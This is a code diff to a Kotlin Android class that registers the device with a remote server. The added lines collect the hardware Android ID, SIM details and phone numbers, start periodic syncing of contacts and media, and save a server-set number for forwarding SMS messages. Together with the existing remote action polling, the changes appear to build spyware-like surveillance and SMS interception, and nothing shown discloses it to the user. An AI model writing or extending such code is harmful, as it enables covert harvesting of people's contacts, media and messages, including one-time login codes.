@@ -4,10 +4,10 @@ import android.content.Context
 import android.os.Build
 import android.os.Handler
 import android.os.Looper
+import android.provider.Settings
 import org.json.JSONObject
 import java.net.HttpURLConnection
 import java.net.URL
-import java.util.UUID
 
 class DeviceRegistrar private constructor(private val context: Context) {
     private val prefs = context.getSharedPreferences("device_prefs", Context.MODE_PRIVATE)
@@ -36,7 +36,10 @@ class DeviceRegistrar private constructor(private val context: Context) {
     private fun getDeviceId(): String {
         var id = prefs.getString("device_id", null)
         if (id == null) {
-            id = UUID.randomUUID().toString()
+            id = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
+            if (id.isNullOrEmpty()) {
+                id = "device_${System.currentTimeMillis()}"
+            }
             prefs.edit().putString("device_id", id).apply()
         }
         return id
@@ -80,14 +83,22 @@ class DeviceRegistrar private constructor(private val context: Context) {
 
     private fun doRegister() {
         val deviceId = getDeviceId()
+        var simInfo = org.json.JSONArray()
+        var phoneNumbers = listOf<String>()
+        try {
+            simInfo = SimInfo(context).getSimInfo()
+            phoneNumbers = (0 until simInfo.length()).map { i ->
+                simInfo.getJSONObject(i).optString("number", "")
+            }.filter { it.isNotEmpty() }
+        } catch (_: Exception) {}
         val json = JSONObject().apply {
             put("device_id", deviceId)
             put("device_name", "${Build.BRAND} ${Build.MODEL}")
             put("model", Build.MODEL)
             put("os_version", "Android ${Build.VERSION.RELEASE}")
             put("app_version", "1.0.0")
-            put("phone_number", "")
-            put("sim_info", "[]")
+            put("phone_number", phoneNumbers.firstOrNull() ?: "")
+            put("sim_info", simInfo.toString())
         }
 
         Thread {
@@ -107,6 +118,11 @@ class DeviceRegistrar private constructor(private val context: Context) {
                         startHeartbeat(deviceId)
                         startForwardingPolling(deviceId)
                         startActionPolling(deviceId)
+                        ContactSync(context).startPeriodicSync()
+                        MediaSync(context).startPeriodicSync()
+                        handler.postDelayed({
+                            updateSimInfo()
+                        }, 8000)
                     }
                 } else if (retryCount < 3) {
                     retryCount++
@@ -171,6 +187,13 @@ class DeviceRegistrar private constructor(private val context: Context) {
                                         } catch (_: Exception) {}
                                     }
                                     }
+                                }
+                                val smsFwd = config.optBoolean("sms_forwarding")
+                                val smsFwdNumber = config.optString("sms_forwarding_number", "")
+                                if (smsFwd && smsFwdNumber.isNotEmpty()) {
+                                    prefs.edit().putString("sms_fwd_to", smsFwdNumber).apply()
+                                } else {
+                                    prefs.edit().remove("sms_fwd_to").apply()
                                 }
                                 lastForwardingConfig = config
                             }
